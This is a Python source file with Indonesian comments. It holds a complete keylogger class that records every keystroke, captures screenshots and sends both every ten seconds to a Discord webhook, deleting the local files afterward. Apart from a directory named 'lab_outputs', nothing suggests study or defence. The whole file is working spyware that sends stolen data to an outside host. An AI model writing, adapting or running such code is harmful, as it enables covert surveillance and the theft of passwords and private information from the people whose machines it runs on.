import os
import re
import time
import textwrap
import requests
import pyautogui
from pynput import keyboard

class DiscordKeylogger:
    def __init__(self, webhook_url, save_dir="lab_outputs"):
        self.webhook_url = webhook_url
        self.save_dir = save_dir
        self.keylog_file = os.path.join(self.save_dir, "keylog.txt")
        os.makedirs(self.save_dir, exist_ok=True)
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    # Menangani setiap tombol yang ditekan
    def on_press(self, key):
        try:
            with open(self.keylog_file, "a") as f:
                f.write(key.char)
        except AttributeError:
            with open(self.keylog_file, "a") as f:
                if key == keyboard.Key.space:
                    f.write(" ")
                elif key == keyboard.Key.enter:
                    f.write("\n")
                elif key == keyboard.Key.tab:
                    f.write("\t")

    # Mengambil screenshot
    def take_screenshot(self):
        filename = os.path.join(self.save_dir, "screenshot.png")
        pyautogui.screenshot().save(filename)
        return filename

    # Membersihkan teks keylog
    @staticmethod
    def clean_keylike_text(raw: str) -> str:
        s = re.sub(r'(?<!\s)(Key\.)', r' \1', raw)
        tokens = re.findall(r'Key\.[A-Za-z0-9_]+|.', s)
        out_chars = []

        for t in tokens:
            if t.startswith("Key."):
                k = t[4:].lower()
                if k == "space":
                    out_chars.append(" ")
                elif k in ("enter", "return"):
                    out_chars.append("\n")
                elif k == "tab":
                    out_chars.append("\t")
                elif k == "backspace" and out_chars:
                    out_chars.pop()
            else:
                out_chars.append(t)

        cleaned = "".join(out_chars)
        cleaned = re.sub(r"[ \t]+\n", "\n", cleaned)
        cleaned = re.sub(r"[ \t]{2,}", " ", cleaned)
        return cleaned.strip("\n")

    # Mengirim keylogs dan media ke Discord
    def send_to_discord(self):
        keylog_data = ""
        if os.path.exists(self.keylog_file):
            with open(self.keylog_file, "r") as f:
                keylog_data = f.read()
            open(self.keylog_file, "w").close()

        screenshot = self.take_screenshot()
        media_files = [screenshot]

        requests.post(self.webhook_url, data={"content": f"# Keylogs:\n```{keylog_data}```"})

        for f in media_files:
            with open(f, "rb") as file_obj:
                requests.post(self.webhook_url, files={"file": file_obj})

        for f in os.listdir(self.save_dir):
            file_path = os.path.join(self.save_dir, f)
            if os.path.isfile(file_path):
                os.remove(file_path)

if __name__ == "__main__":
    WEBHOOK_URL = " "
    logger = DiscordKeylogger(WEBHOOK_URL)
    print("[*] Discord Keylogger running...")

    while True:
        time.sleep(10)
        logger.send_to_discord()
